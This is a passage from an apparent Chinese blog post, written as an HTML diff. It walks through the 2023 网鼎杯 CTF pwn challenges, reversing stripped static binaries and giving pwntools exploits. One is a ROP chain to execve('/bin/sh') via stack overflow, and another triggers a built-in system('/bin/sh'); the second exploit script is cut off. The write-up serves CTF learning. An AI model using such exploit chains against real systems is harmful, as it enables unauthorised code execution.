@@ -1,0 +1,435 @@
+<!DOCTYPE html>
+<html lang=en>
+<head>
+    <!-- so meta -->
+    <meta charset="utf-8">
+    <meta http-equiv="X-UA-Compatible" content="IE=edge">
+    <meta name="HandheldFriendly" content="True">
+    <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=5" />
+    <meta name="description" content="题目的本身的难度非常简单 因为是RHG类型的题目 不过大部分都是静态编译的题目 并且删除了符号表 以前还没有接触过类似的题目 所以这次来学习一下怎么逻辑推理出各个函数 下面的顺序被我打乱了 因为附件也是学长发的  所以凑合着做吧 pwn1 32位 保护机制基本上全关了 解析来进入ida 由于删除了符号表 所以也不知道哪一个函数是main 先点进唯一有符号的start函数 &#x2F;&#x2F; positive s">
+<meta property="og:type" content="article">
+<meta property="og:title" content="2023网鼎杯">
+<meta property="og:url" content="http://example.com/2023/04/20/2023%E7%BD%91%E9%BC%8E%E6%9D%AF/index.html">
+<meta property="og:site_name" content="C12en">
+<meta property="og:description" content="题目的本身的难度非常简单 因为是RHG类型的题目 不过大部分都是静态编译的题目 并且删除了符号表 以前还没有接触过类似的题目 所以这次来学习一下怎么逻辑推理出各个函数 下面的顺序被我打乱了 因为附件也是学长发的  所以凑合着做吧 pwn1 32位 保护机制基本上全关了 解析来进入ida 由于删除了符号表 所以也不知道哪一个函数是main 先点进唯一有符号的start函数 &#x2F;&#x2F; positive s">
+<meta property="og:locale" content="en_US">
+<meta property="og:image" content="https://blog-1259781238.cos.ap-nanjing.myqcloud.com/202304201152958.png">
+<meta property="og:image" content="https://blog-1259781238.cos.ap-nanjing.myqcloud.com/202304201315858.png">
+<meta property="og:image" content="https://blog-1259781238.cos.ap-nanjing.myqcloud.com/202304201716530.png">
+<meta property="og:image" content="https://blog-1259781238.cos.ap-nanjing.myqcloud.com/202304201723007.png">
+<meta property="og:image" content="https://blog-1259781238.cos.ap-nanjing.myqcloud.com/202304202051606.png">
+<meta property="og:image" content="https://blog-1259781238.cos.ap-nanjing.myqcloud.com/202305161330928.png">
+<meta property="og:image" content="https://blog-1259781238.cos.ap-nanjing.myqcloud.com/202305162134515.png">
+<meta property="og:image" content="https://blog-1259781238.cos.ap-nanjing.myqcloud.com/202305162138395.png">
+<meta property="article:published_time" content="2023-04-20T03:50:31.000Z">
+<meta property="article:modified_time" content="2023-09-14T17:17:22.364Z">
+<meta property="article:author" content="C12en">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:image" content="https://blog-1259781238.cos.ap-nanjing.myqcloud.com/202304201152958.png">
+    
+    
+      
+        
+          <link rel="shortcut icon" href="https://blog-1259781238.cos.ap-nanjing.myqcloud.com/202309142232390.png&#39;">
+        
+      
+      
+        
+          <link rel="icon" type="image/png" href="https://blog-1259781238.cos.ap-nanjing.myqcloud.com/202309142232390.png&#39;" sizes="192x192">
+        
+      
+      
+        
+          <link rel="apple-touch-icon" sizes="180x180" href="https://blog-1259781238.cos.ap-nanjing.myqcloud.com/202309142232390.png&#39;">
+        
+      
+    
+    <!-- title -->
+    <title>2023网鼎杯</title>
+    <!-- async scripts -->
+    <!-- Google Analytics -->
+
+
+    <!-- Umami Analytics -->
+
+
+    <!-- styles -->
+    
+<link rel="stylesheet" href="/css/style.css">
+
+    <!-- persian styles -->
+    
+    <!-- rss -->
+    
+    
+	<!-- mathjax -->
+	
+<meta name="generator" content="Hexo 6.3.0"><link rel="alternate" href="/atom.xml" title="C12en" type="application/atom+xml">
+</head>
+
+<body class="max-width mx-auto px3 ltr">
+    
+      <div id="header-post">
+  <a id="menu-icon" href="#" aria-label="Menu"><i class="fa-solid fa-bars fa-lg"></i></a>
+  <a id="menu-icon-tablet" href="#" aria-label="Menu"><i class="fa-solid fa-bars fa-lg"></i></a>
+  <a id="top-icon-tablet" href="#" aria-label="Top" onclick="$('html, body').animate({ scrollTop: 0 }, 'fast');" style="display:none;"><i class="fa-solid fa-chevron-up fa-lg"></i></a>
+  <span id="menu">
+    <span id="nav">
+      <ul>
+        <!--
+       --><li><a href="/">Home</a></li><!--
+     --><!--
+       --><li><a href="/about/">About</a></li><!--
+     --><!--
+       --><li><a href="/archives/">Writing</a></li><!--
+     --><!--
+       --><li><a href="/categories/">categories</a></li><!--
+     --><!--
+       --><li><a href="/search/">Search</a></li><!--
+     -->
+      </ul>
+    </span>
+    <br/>
+    <span id="actions">
+      <ul>
+        
+        <li><a class="icon" aria-label="Previous post" href="/2023/04/27/house-of-lore/"><i class="fa-solid fa-chevron-left" aria-hidden="true" onmouseover="$('#i-prev').toggle();" onmouseout="$('#i-prev').toggle();"></i></a></li>
+        
+        
+        <li><a class="icon" aria-label="Next post" href="/2023/04/18/House-of-KiWi/"><i class="fa-solid fa-chevron-right" aria-hidden="true" onmouseover="$('#i-next').toggle();" onmouseout="$('#i-next').toggle();"></i></a></li>
+        
+        <li><a class="icon" aria-label="Back to top" href="#" onclick="$('html, body').animate({ scrollTop: 0 }, 'fast');"><i class="fa-solid fa-chevron-up" aria-hidden="true" onmouseover="$('#i-top').toggle();" onmouseout="$('#i-top').toggle();"></i></a></li>
+        <li><a class="icon" aria-label="Share post" href="#"><i class="fa-solid fa-share-alt" aria-hidden="true" onmouseover="$('#i-share').toggle();" onmouseout="$('#i-share').toggle();" onclick="$('#share').toggle();return false;"></i></a></li>
+      </ul>
+      <span id="i-prev" class="info" style="display:none;">Previous post</span>
+      <span id="i-next" class="info" style="display:none;">Next post</span>
+      <span id="i-top" class="info" style="display:none;">Back to top</span>
+      <span id="i-share" class="info" style="display:none;">Share post</span>
+    </span>
+    <br/>
+    <div id="share" style="display: none">
+      <ul>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.facebook.com/sharer.php?u=http://example.com/2023/04/20/2023%E7%BD%91%E9%BC%8E%E6%9D%AF/"><i class="fab fa-facebook " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://twitter.com/share?url=http://example.com/2023/04/20/2023%E7%BD%91%E9%BC%8E%E6%9D%AF/&text=2023网鼎杯"><i class="fab fa-twitter " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.linkedin.com/shareArticle?url=http://example.com/2023/04/20/2023%E7%BD%91%E9%BC%8E%E6%9D%AF/&title=2023网鼎杯"><i class="fab fa-linkedin " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://pinterest.com/pin/create/bookmarklet/?url=http://example.com/2023/04/20/2023%E7%BD%91%E9%BC%8E%E6%9D%AF/&is_video=false&description=2023网鼎杯"><i class="fab fa-pinterest " aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="mailto:?subject=2023网鼎杯&body=Check out this article: http://example.com/2023/04/20/2023%E7%BD%91%E9%BC%8E%E6%9D%AF/"><i class="fa-solid fa-envelope " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://getpocket.com/save?url=http://example.com/2023/04/20/2023%E7%BD%91%E9%BC%8E%E6%9D%AF/&title=2023网鼎杯"><i class="fab fa-get-pocket " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://reddit.com/submit?url=http://example.com/2023/04/20/2023%E7%BD%91%E9%BC%8E%E6%9D%AF/&title=2023网鼎杯"><i class="fab fa-reddit " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.stumbleupon.com/submit?url=http://example.com/2023/04/20/2023%E7%BD%91%E9%BC%8E%E6%9D%AF/&title=2023网鼎杯"><i class="fab fa-stumbleupon " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://digg.com/submit?url=http://example.com/2023/04/20/2023%E7%BD%91%E9%BC%8E%E6%9D%AF/&title=2023网鼎杯"><i class="fab fa-digg " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.tumblr.com/share/link?url=http://example.com/2023/04/20/2023%E7%BD%91%E9%BC%8E%E6%9D%AF/&name=2023网鼎杯&description="><i class="fab fa-tumblr " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://news.ycombinator.com/submitlink?u=http://example.com/2023/04/20/2023%E7%BD%91%E9%BC%8E%E6%9D%AF/&t=2023网鼎杯"><i class="fab fa-hacker-news " aria-hidden="true"></i></a></li>
+</ul>
+
+    </div>
+    
+    
+      <div id="toc">
+        <ol class="toc"><li class="toc-item toc-level-1"><a class="toc-link" href="#pwn1"><span class="toc-number">1.</span> <span class="toc-text">pwn1</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#pwn2"><span class="toc-number">2.</span> <span class="toc-text">pwn2</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#pwn3"><span class="toc-number">3.</span> <span class="toc-text">pwn3</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#pwn4"><span class="toc-number">4.</span> <span class="toc-text">pwn4</span></a></li></ol>
+      </div>
+    
+  </span>
+</div>
+
+    
+    <div class="content index py4 ">
+        
+        <article class="post h-entry" itemscope itemtype="http://schema.org/BlogPosting">
+  <header>
+    
+    <h1 class="posttitle p-name" itemprop="name headline">
+        2023网鼎杯
+    </h1>
+
+
+
+    <div class="meta">
+      <span class="author p-author h-card" itemprop="author" itemscope itemtype="http://schema.org/Person">
+        <span class="p-name" itemprop="name">C12en</span>
+      </span>
+      
+    <div class="postdate">
+      
+        <time datetime="2023-04-20T03:50:31.000Z" class="dt-published" itemprop="datePublished">2023-04-20</time>
+        
+        (Updated: <time datetime="2023-09-14T17:17:22.364Z" class="dt-updated" itemprop="dateModified">2023-09-15</time>)
+        
+      
+    </div>
+
+
+      
+    <div class="article-category">
+        <i class="fa-solid fa-archive"></i>
+        <a class="category-link" href="/categories/wp/">wp</a>
+    </div>
+
+
+      
+
+    </div>
+  </header>
+  
+
+  <div class="content e-content" itemprop="articleBody">
+    <link rel="stylesheet" type="text/css" href="https://cdn.jsdelivr.net/lightgallery.js/1.0.1/css/lightgallery.min.css" /><div class=".article-gallery"><p>题目的本身的难度非常简单 因为是RHG类型的题目 不过大部分都是静态编译的题目 并且删除了符号表 以前还没有接触过类似的题目 所以这次来学习一下怎么逻辑推理出各个函数</p>
+<p>下面的顺序被我打乱了 因为附件也是学长发的  所以凑合着做吧</p>
+<h1 id="pwn1"><a href="#pwn1" class="headerlink" title="pwn1"></a>pwn1</h1><p><a target="_blank" rel="noopener" href="https://blog-1259781238.cos.ap-nanjing.myqcloud.com/202304201152958.png" title="image-20230420115201871" class="gallery-item"><img src="https://blog-1259781238.cos.ap-nanjing.myqcloud.com/202304201152958.png" alt="image-20230420115201871"></a></p>
+<p>32位 保护机制基本上全关了</p>
+<p>解析来进入ida 由于删除了符号表 所以也不知道哪一个函数是main 先点进唯一有符号的start函数</p>
+<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="comment">// positive sp value has been detected, the output may be wrong!</span></span><br><span class="line"><span class="type">void</span> __usercall __noreturn <span class="title function_">start</span><span class="params">(<span class="type">int</span> a1@&lt;eax&gt;, <span class="type">int</span> a2@&lt;edx&gt;)</span></span><br><span class="line">&#123;</span><br><span class="line">  <span class="type">int</span> v2; <span class="comment">// esi</span></span><br><span class="line">  <span class="type">int</span> v3; <span class="comment">// [esp-4h] [ebp-4h] BYREF</span></span><br><span class="line">  <span class="type">void</span> *retaddr; <span class="comment">// [esp+0h] [ebp+0h] BYREF</span></span><br><span class="line"></span><br><span class="line">  v2 = v3;</span><br><span class="line">  v3 = a1;</span><br><span class="line">  sub_8049200(sub_804890C, v2, &amp;retaddr, sub_80495D0, sub_8049670, a2, &amp;v3);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p>根据以往的经验分析 sub_8049200应该是libc_start_main函数</p>
+<p>那么作为其rdi参数的sub_804890C应该是main函数了</p>
+<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="type">void</span> __noreturn <span class="title function_">sub_804890C</span><span class="params">()</span></span><br><span class="line">&#123;</span><br><span class="line">  sub_804887C();</span><br><span class="line">  <span class="keyword">while</span> ( <span class="number">1</span> )</span><br><span class="line">    sub_80488CE();</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p>跟进以后 可以看到不像是libc函数 为出题人编写的 所以猜测正确 为main函数 接下来分别跟进两个函数</p>
+<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="type">int</span> <span class="title function_">sub_804887C</span><span class="params">()</span></span><br><span class="line">&#123;</span><br><span class="line">  sub_80511E0(off_80EB4BC, <span class="number">0</span>);</span><br><span class="line">  sub_80511E0(off_80EB4B8, <span class="number">0</span>);</span><br><span class="line">  sub_80511E0(off_80EB4B4, <span class="number">0</span>);</span><br><span class="line">  <span class="keyword">return</span> sub_806D410(<span class="number">300</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p>三个一样的函数 对.data段上三个相邻的参数进行操作 并且第二个参数还是0 这怎么看都是清空缓存区 用的setbuf函数嘛</p>
+<p>至于最后的函数调用 我猜是alarm闹钟函数 毕竟有个300的参数</p>
+<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="type">int</span> <span class="title function_">sub_80488CE</span><span class="params">()</span></span><br><span class="line">&#123;</span><br><span class="line">  <span class="type">char</span> v1[<span class="number">104</span>]; <span class="comment">// [esp+0h] [ebp-68h] BYREF</span></span><br><span class="line"></span><br><span class="line">  sub_804F4C0(<span class="string">&quot;please input what you want say&quot;</span>);</span><br><span class="line">  sub_806DDA0(<span class="number">0</span>, v1, <span class="number">256</span>);</span><br><span class="line">  <span class="keyword">return</span> sub_804F9D0(v1);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p>这个函数应该就是漏洞点了   sub_804F4C0函数要么是printf要么是puts 直接运行程序并没有输出换行符 那么应该是printf</p>
+<p>sub_806DDA0看参数应该是read函数 最后的sub_804F9D0函数经过直接运行程序猜测是puts函数</p>
+<p><a target="_blank" rel="noopener" href="https://blog-1259781238.cos.ap-nanjing.myqcloud.com/202304201315858.png" title="image-20230420131455799" class="gallery-item"><img src="https://blog-1259781238.cos.ap-nanjing.myqcloud.com/202304201315858.png" alt="image-20230420131455799"></a></p>
+<p>那么至此程序的主要逻辑就明了了   while重复执行sub_80488CE函数 该函数存在栈溢出漏洞</p>
+<p>再加上是静态编译 那么此时直接利用ROPgadget自带的构造rop链 getshell</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">ROPgadget --binary pwn --ropchain</span><br></pre></td></tr></table></figure>
+
+<p>完整exp:</p>
+<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span>*</span><br><span class="line"><span class="keyword">from</span> ctypes <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">from</span> struct <span class="keyword">import</span> *</span><br><span class="line">io = process(<span class="string">&quot;./pwn&quot;</span>)</span><br><span class="line"><span class="comment">#io = remote(&quot;node.yuzhian.com.cn&quot;,32980)</span></span><br><span class="line">context.log_level = <span class="string">&quot;debug&quot;</span></span><br><span class="line">context.terminal = [<span class="string">&#x27;tmux&#x27;</span>,<span class="string">&#x27;splitw&#x27;</span>,<span class="string">&#x27;-h&#x27;</span>]</span><br><span class="line"><span class="comment">#libc = ELF(&quot;/home/chen/glibc-all-in-one/libs/2.31-0ubuntu9.9_amd64/libc-2.31.so&quot;)</span></span><br><span class="line"><span class="comment">#libc = cdll.LoadLibrary(&#x27;/lib/x86_64-linux-gnu/libc.so.6&#x27;)</span></span><br><span class="line"><span class="comment"># context.arch = &quot;i386&quot;</span></span><br><span class="line">context.arch = <span class="string">&quot;amd64&quot;</span></span><br><span class="line">elf = ELF(<span class="string">&quot;./pwn&quot;</span>)</span><br><span class="line"><span class="keyword">def</span> <span class="title function_">debug</span>():</span><br><span class="line">    gdb.attach(io)</span><br><span class="line">    pause()</span><br><span class="line"></span><br><span class="line">io.recvuntil(<span class="string">&quot;please input what you want say&quot;</span>)</span><br><span class="line">p = <span class="string">b&#x27;a&#x27;</span> * (<span class="number">0x68</span>+<span class="number">4</span>)</span><br><span class="line">p += pack(<span class="string">&#x27;&lt;I&#x27;</span>, <span class="number">0x0806f83b</span>) <span class="comment"># pop edx ; ret</span></span><br><span class="line">p += pack(<span class="string">&#x27;&lt;I&#x27;</span>, <span class="number">0x080eb060</span>) <span class="comment"># @ .data</span></span><br><span class="line">p += pack(<span class="string">&#x27;&lt;I&#x27;</span>, <span class="number">0x080b8eb6</span>) <span class="comment"># pop eax ; ret</span></span><br><span class="line">p += <span class="string">b&#x27;/bin&#x27;</span></span><br><span class="line">p += pack(<span class="string">&#x27;&lt;I&#x27;</span>, <span class="number">0x0805502b</span>) <span class="comment"># mov dword ptr [edx], eax ; ret</span></span><br><span class="line">p += pack(<span class="string">&#x27;&lt;I&#x27;</span>, <span class="number">0x0806f83b</span>) <span class="comment"># pop edx ; ret</span></span><br><span class="line">p += pack(<span class="string">&#x27;&lt;I&#x27;</span>, <span class="number">0x080eb064</span>) <span class="comment"># @ .data + 4</span></span><br><span class="line">p += pack(<span class="string">&#x27;&lt;I&#x27;</span>, <span class="number">0x080b8eb6</span>) <span class="comment"># pop eax ; ret</span></span><br><span class="line">p += <span class="string">b&#x27;//sh&#x27;</span></span><br><span class="line">p += pack(<span class="string">&#x27;&lt;I&#x27;</span>, <span class="number">0x0805502b</span>) <span class="comment"># mov dword ptr [edx], eax ; ret</span></span><br><span class="line">p += pack(<span class="string">&#x27;&lt;I&#x27;</span>, <span class="number">0x0806f83b</span>) <span class="comment"># pop edx ; ret</span></span><br><span class="line">p += pack(<span class="string">&#x27;&lt;I&#x27;</span>, <span class="number">0x080eb068</span>) <span class="comment"># @ .data + 8</span></span><br><span class="line">p += pack(<span class="string">&#x27;&lt;I&#x27;</span>, <span class="number">0x080495a3</span>) <span class="comment"># xor eax, eax ; ret</span></span><br><span class="line">p += pack(<span class="string">&#x27;&lt;I&#x27;</span>, <span class="number">0x0805502b</span>) <span class="comment"># mov dword ptr [edx], eax ; ret</span></span><br><span class="line">p += pack(<span class="string">&#x27;&lt;I&#x27;</span>, <span class="number">0x080481c9</span>) <span class="comment"># pop ebx ; ret</span></span><br><span class="line">p += pack(<span class="string">&#x27;&lt;I&#x27;</span>, <span class="number">0x080eb060</span>) <span class="comment"># @ .data</span></span><br><span class="line">p += pack(<span class="string">&#x27;&lt;I&#x27;</span>, <span class="number">0x080df8bd</span>) <span class="comment"># pop ecx ; ret</span></span><br><span class="line">p += pack(<span class="string">&#x27;&lt;I&#x27;</span>, <span class="number">0x080eb068</span>) <span class="comment"># @ .data + 8</span></span><br><span class="line">p += pack(<span class="string">&#x27;&lt;I&#x27;</span>, <span class="number">0x0806f83b</span>) <span class="comment"># pop edx ; ret</span></span><br><span class="line">p += pack(<span class="string">&#x27;&lt;I&#x27;</span>, <span class="number">0x080eb068</span>) <span class="comment"># @ .data + 8</span></span><br><span class="line">p += pack(<span class="string">&#x27;&lt;I&#x27;</span>, <span class="number">0x080495a3</span>) <span class="comment"># xor eax, eax ; ret</span></span><br><span class="line">p += pack(<span class="string">&#x27;&lt;I&#x27;</span>, <span class="number">0x0807b2f6</span>) <span class="comment"># inc eax ; ret</span></span><br><span class="line">p += pack(<span class="string">&#x27;&lt;I&#x27;</span>, <span class="number">0x0807b2f6</span>) <span class="comment"># inc eax ; ret</span></span><br><span class="line">p += pack(<span class="string">&#x27;&lt;I&#x27;</span>, <span class="number">0x0807b2f6</span>) <span class="comment"># inc eax ; ret</span></span><br><span class="line">p += pack(<span class="string">&#x27;&lt;I&#x27;</span>, <span class="number">0x0807b2f6</span>) <span class="comment"># inc eax ; ret</span></span><br><span class="line">p += pack(<span class="string">&#x27;&lt;I&#x27;</span>, <span class="number">0x0807b2f6</span>) <span class="comment"># inc eax ; ret</span></span><br><span class="line">p += pack(<span class="string">&#x27;&lt;I&#x27;</span>, <span class="number">0x0807b2f6</span>) <span class="comment"># inc eax ; ret</span></span><br><span class="line">p += pack(<span class="string">&#x27;&lt;I&#x27;</span>, <span class="number">0x0807b2f6</span>) <span class="comment"># inc eax ; ret</span></span><br><span class="line">p += pack(<span class="string">&#x27;&lt;I&#x27;</span>, <span class="number">0x0807b2f6</span>) <span class="comment"># inc eax ; ret</span></span><br><span class="line">p += pack(<span class="string">&#x27;&lt;I&#x27;</span>, <span class="number">0x0807b2f6</span>) <span class="comment"># inc eax ; ret</span></span><br><span class="line">p += pack(<span class="string">&#x27;&lt;I&#x27;</span>, <span class="number">0x0807b2f6</span>) <span class="comment"># inc eax ; ret</span></span><br><span class="line">p += pack(<span class="string">&#x27;&lt;I&#x27;</span>, <span class="number">0x0807b2f6</span>) <span class="comment"># inc eax ; ret</span></span><br><span class="line">p += pack(<span class="string">&#x27;&lt;I&#x27;</span>, <span class="number">0x0806d443</span>) <span class="comment"># int 0x80</span></span><br><span class="line">success(<span class="string">&quot;len :&quot;</span>+<span class="built_in">hex</span>(<span class="built_in">len</span>(p)))</span><br><span class="line">io.sendline(p)</span><br><span class="line">io.interactive()</span><br></pre></td></tr></table></figure>
+
+<h1 id="pwn2"><a href="#pwn2" class="headerlink" title="pwn2"></a>pwn2</h1><p><a target="_blank" rel="noopener" href="https://blog-1259781238.cos.ap-nanjing.myqcloud.com/202304201716530.png" title="image-20230420171633445" class="gallery-item"><img src="https://blog-1259781238.cos.ap-nanjing.myqcloud.com/202304201716530.png" alt="image-20230420171633445"></a></p>
+<p>还是跟上题一样 保护基本没开 静态编译32位</p>
+<p>老规矩 还是跟着start函数索引到main函数</p>
+<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="type">int</span> <span class="title function_">sub_80488CE</span><span class="params">()</span></span><br><span class="line">&#123;</span><br><span class="line">  <span class="type">int</span> v0; <span class="comment">// eax</span></span><br><span class="line">  <span class="type">char</span> v2; <span class="comment">// [esp-Ch] [ebp-24h]</span></span><br><span class="line">  <span class="type">int</span> v3; <span class="comment">// [esp+Ch] [ebp-Ch]</span></span><br><span class="line"></span><br><span class="line">  sub_804887C();</span><br><span class="line">  v3 = sub_8059F50(<span class="number">48</span>);</span><br><span class="line">  sub_8048987(v3, <span class="number">48</span>);</span><br><span class="line">  v0 = sub_804DBD0(v3 + <span class="number">16</span>) + <span class="number">5</span>;</span><br><span class="line">  <span class="keyword">if</span> ( v0 == <span class="number">8</span> )</span><br><span class="line">  &#123;</span><br><span class="line">    sub_8048987(v3, <span class="number">48</span>);</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">else</span> <span class="keyword">if</span> ( v0 &gt; <span class="number">8</span> )</span><br><span class="line">  &#123;</span><br><span class="line">    <span class="keyword">if</span> ( v0 == <span class="number">10</span> )</span><br><span class="line">      <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">    <span class="keyword">if</span> ( v0 == <span class="number">85145</span> )</span><br><span class="line">      sub_804F700(<span class="string">&quot;/bin/sh&quot;</span>);</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">else</span> <span class="keyword">if</span> ( v0 == <span class="number">6</span> )</span><br><span class="line">  &#123;</span><br><span class="line">    sub_804FA00(<span class="string">&quot;where is shell&quot;</span>, v2);</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">return</span> <span class="number">1</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p>第一个涉及到的函数</p>
+<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="type">int</span> <span class="title function_">sub_804887C</span><span class="params">()</span></span><br><span class="line">&#123;</span><br><span class="line">  sub_8051720(off_80EB4BC, <span class="number">0</span>);</span><br><span class="line">  sub_8051720(off_80EB4B8, <span class="number">0</span>);</span><br><span class="line">  sub_8051720(off_80EB4B4, <span class="number">0</span>);</span><br><span class="line">  <span class="keyword">return</span> sub_806D9C0(<span class="number">300</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p>很明显是setbuf清空缓存区</p>
+<p>第二个函数 参数是一个数值 并且在函数最后找到了这样一行字符串</p>
+<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="keyword">if</span> ( v4 != _EBX )</span><br><span class="line">  sub_8056280(<span class="string">&quot;__libc_malloc&quot;</span>);</span><br></pre></td></tr></table></figure>
+
+<p>所以大胆猜测是malloc 随后断点打在call 后 观察eax是否为堆地址返回值 成功验证猜想</p>
+<p><a target="_blank" rel="noopener" href="https://blog-1259781238.cos.ap-nanjing.myqcloud.com/202304201723007.png" title="image-20230420172357977" class="gallery-item"><img src="https://blog-1259781238.cos.ap-nanjing.myqcloud.com/202304201723007.png" alt="image-20230420172357977"></a></p>
+<p>至于第三个函数 看参数没有多少印象 所以觉得是出题人自己编写的函数 还得跟进一下看实现逻辑</p>
+<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="type">int</span> __cdecl <span class="title function_">sub_8048987</span><span class="params">(<span class="type">int</span> a1, <span class="type">int</span> a2)</span></span><br><span class="line">&#123;</span><br><span class="line">  <span class="type">int</span> i; <span class="comment">// [esp+Ch] [ebp-Ch]</span></span><br><span class="line"></span><br><span class="line">  <span class="keyword">for</span> ( i = <span class="number">0</span>; a2 - <span class="number">1</span> &gt; i; ++i )</span><br><span class="line">  &#123;</span><br><span class="line">    <span class="keyword">if</span> ( sub_806E380(<span class="number">0</span>, i + a1, <span class="number">1</span>) != <span class="number">1</span> )</span><br><span class="line">      sub_804E660(<span class="number">1</span>);</span><br><span class="line">    <span class="keyword">if</span> ( *(_BYTE *)(i + a1) == <span class="number">10</span> )</span><br><span class="line">      <span class="keyword">break</span>;</span><br><span class="line">  &#125;</span><br><span class="line">  *(_BYTE *)(i + a1) = <span class="number">0</span>;</span><br><span class="line">  <span class="keyword">return</span> i;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p>sub_806E380函数的参数构造有点像read  sub_804E660的参数构造像exit函数</p>
+<p>那么结合函数整体的逻辑 我认为是一个往刚刚申请的chunk中读入数据的函数 当读入的字符为\n时  结束读入 并且把\n字符所处的位置设置为\x00</p>
+<p>接下来第四个函数应该是最关键的了  从main函数的逻辑来看 这个函数的返回值将决定是否能够触发system(“&#x2F;bin&#x2F;sh”)</p>
+<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="type">int</span> __cdecl <span class="title function_">sub_804DBD0</span><span class="params">(<span class="type">int</span> a1)</span></span><br><span class="line">&#123;</span><br><span class="line">  <span class="keyword">return</span> sub_804E880(a1, <span class="number">0</span>, <span class="number">10</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p>内部还调用了一个函数 不过这个函数的参数就有点眼熟了  a1是chunk的用户块+0x10处的地址 第二个参数为0</p>
+<p>第三个参数是10  有点像strtol函数 为了印证猜想 看看函数结束后的eax寄存器是不是预期返回值</p>
+<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">payload = cyclic(<span class="number">0x10</span>)+<span class="string">b&#x27;85140&#x27;</span></span><br></pre></td></tr></table></figure>
+
+<p><a target="_blank" rel="noopener" href="https://blog-1259781238.cos.ap-nanjing.myqcloud.com/202304202051606.png" title="image-20230420205112566" class="gallery-item"><img src="https://blog-1259781238.cos.ap-nanjing.myqcloud.com/202304202051606.png" alt="image-20230420205112566"></a></p>
+<p>之所以多了5 是因为在v0的值是strtol函数的返回值+5</p>
+<p>那么就会进入对应的if判断式 直接调用system(“&#x2F;bin&#x2F;sh”)</p>
+<p>至于最后的函数 实在是猜不出来 最后用sig文件解析了一下 再加上chatgpt 大概了解到其是一个可以直接把字符串输出到标准输出流的函数</p>
+<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="type">int</span> <span class="title function_">sub_804FA00</span><span class="params">(<span class="type">int</span> a1, ...)</span></span><br><span class="line">&#123;</span><br><span class="line">  va_list va; <span class="comment">// [esp+14h] [ebp+8h] BYREF</span></span><br><span class="line"></span><br><span class="line">  va_start(va, a1);</span><br><span class="line">  <span class="keyword">return</span> _IO_vfprintf_internal(off_80EB4B8, a1, (<span class="type">char</span> *)va);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p>exp：</p>
+<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span>*</span><br><span class="line"><span class="keyword">from</span> ctypes <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">from</span> struct <span class="keyword">import</span> *</span><br><span class="line">io = process(<span class="string">&quot;./pwn&quot;</span>)</span><br><span class="line"><span class="comment">#io = remote(&quot;node.yuzhian.com.cn&quot;,32980)</span></span><br><span class="line">context.log_level = <span class="string">&quot;debug&quot;</span></span><br><span class="line">context.terminal = [<span class="string">&#x27;tmux&#x27;</span>,<span class="string">&#x27;splitw&#x27;</span>,<span class="string">&#x27;-h&#x27;</span>]</span><br><span class="line"><span class="comment">#libc = ELF(&quot;/home/chen/glibc-all-in-one/libs/2.31-0ubuntu9.9_amd64/libc-2.31.so&quot;)</span></span><br><span class="line"><span class="comment">#libc = cdll.LoadLibrary(&#x27;/lib/x86_64-linux-gnu/libc.so.6&#x27;)</span></span><br><span class="line"><span class="comment"># context.arch = &quot;i386&quot;</span></span><br><span class="line">context.arch = <span class="string">&quot;amd64&quot;</span></span><br><span class="line">elf = ELF(<span class="string">&quot;./pwn&quot;</span>)</span><br><span class="line"><span class="keyword">def</span> <span class="title function_">debug</span>():</span><br><span class="line">    gdb.attach(io)</span><br><span class="line">    pause()</span><br><span class="line"></span><br><span class="line">payload = cyclic(<span class="number">0x10</span>)+<span class="string">b&#x27;85140&#x27;</span></span><br><span class="line"><span class="comment"># 